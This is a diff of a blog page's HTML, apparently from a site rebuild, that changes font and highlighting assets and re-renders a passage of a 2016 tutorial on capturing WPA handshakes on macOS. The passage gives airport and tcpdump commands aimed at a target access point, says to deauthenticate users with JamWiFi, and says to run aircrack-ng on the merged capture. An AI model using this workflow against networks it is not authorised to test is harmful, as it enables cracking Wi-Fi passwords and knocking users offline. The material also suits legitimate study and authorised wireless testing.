@@ -13,25 +13,19 @@
     <meta property="og:image:width" content="200" />
     <meta property="og:image:height" content="200" />
      
-        <link href="https://fonts.geekzu.org/css2?family=Noto+Serif+SC:wght@400;900&display=swap" rel="stylesheet">
-        <!-- <link href="https://fonts.loli.net/css2?family=Noto+Serif+SC:wght@400;900&display=swap" rel="stylesheet"> -->
-        <!-- <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;900&display=swap" rel="stylesheet"> -->
+        <link href="https://fonts.geekzu.org/css2?family=Noto+Serif+SC:wght@500;600;900&display=swap" rel="stylesheet">
+        <!-- <link href="https://fonts.loli.net/css2?family=Noto+Serif+SC:wght@500;900&display=swap" rel="stylesheet"> -->
+        <!-- <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@500;900&display=swap" rel="stylesheet"> -->
         <style>
             body {
                 font-family: var(--serif-font-family);
             }
         </style>
     
-    <link href="https://fonts.loli.net/css2?family=Source+Serif+Pro:wght@400;700&display=swap" rel="stylesheet"> 
+    <!-- <link href="https://fonts.loli.net/css2?family=Source+Serif+Pro:wght@500;600;700&display=swap" rel="stylesheet">  -->
     <link rel="shortcut icon" href="/imgs/favicon.png">
     
-    <link rel="stylesheet"
-        href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.2/build/styles/atom-one-light.min.css">
         <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
-    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.1.2/build/highlight.min.js"></script>
-
-    <script>hljs.initHighlightingOnLoad();</script>
-    
     <!--  -->
     
 <link rel="stylesheet" href="/css/style.css">
@@ -238,8 +232,6 @@ mjx-container[display="true"] + br {
     <div class="post-meta">
         <span class="post-time">2016-07-07</span>
         
-            <span class="post-time">最后编辑 2 years ago</span>
-        
         
         <span class="post-author">kleist</span>
         
@@ -300,8 +292,19 @@ sudo airport en0 sniff $CHANNEL</code></pre>
 <h2 id="Sniff-The-good-way-with-tcpdump"><a href="#Sniff-The-good-way-with-tcpdump" class="headerlink" title="Sniff - The good way with tcpdump"></a><strong>Sniff</strong> - The good way with <code>tcpdump</code></h2><p>Using <code>airport</code> presents some issues. You cannot know if you got the beacon and the handshake until you stop the capture and try with <code>aircrack-ng</code>.</p>
 <p>You capture a lot of unuseful packets too.</p>
 <p>Using <code>tcpdump</code> is more efficient.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> BSSID=<span class="hljs-variable">$TARGET_MAC_ADDRESS</span><br><span class="hljs-comment"># disassociate</span><br>sudo airport -z<br><span class="hljs-comment"># set the channel</span><br><span class="hljs-comment"># DO NOT PUT SPACE BETWEEN -c and the channel</span><br><span class="hljs-comment"># for example sudo airport -c6</span><br>sudo airport -c<span class="hljs-variable">$CHANNEL</span><br><span class="hljs-comment"># capture a beacon frame from the AP</span><br>sudo tcpdump <span class="hljs-string">&quot;type mgt subtype beacon and ether src <span class="hljs-variable">$BSSID</span>&quot;</span> -I -c 1 -i en1 -w beacon.cap<br><span class="hljs-comment"># wait for the WPA handshake</span><br>sudo tcpdump <span class="hljs-string">&quot;ether proto 0x888e and ether host <span class="hljs-variable">$BSSID</span>&quot;</span> -I -U -vvv -i en1 -w handshake.cap<br><span class="hljs-comment"># merge the two files</span><br>mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap<br></code></pre></td></tr></table></figure>
-
+<pre><code class="bash">export BSSID=$TARGET_MAC_ADDRESS
+# disassociate
+sudo airport -z
+# set the channel
+# DO NOT PUT SPACE BETWEEN -c and the channel
+# for example sudo airport -c6
+sudo airport -c$CHANNEL
+# capture a beacon frame from the AP
+sudo tcpdump &quot;type mgt subtype beacon and ether src $BSSID&quot; -I -c 1 -i en1 -w beacon.cap
+# wait for the WPA handshake
+sudo tcpdump &quot;ether proto 0x888e and ether host $BSSID&quot; -I -U -vvv -i en1 -w handshake.cap
+# merge the two files
+mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap</code></pre>
 <p>When you launch those lines, the first <code>tcpdump</code> easily captures a beacon and the second waits for the handshake.</p>
 <p>Use JamWiFi to deauth some users, and when <code>tcpdump</code> shows you it got 4 frames or more, Ctrl-C. It appears you can use less that 4 frames, but it depends on the frames you got (for instance 1,2 or 2,3 are sufficient). Anyway you should normally get at least 4. If nothing shows, try to deauth another user.</p>
 <p>Now you have everything in <code>capture.cap</code>. You can also run <code>aircrack-ng</code> on it.</p>
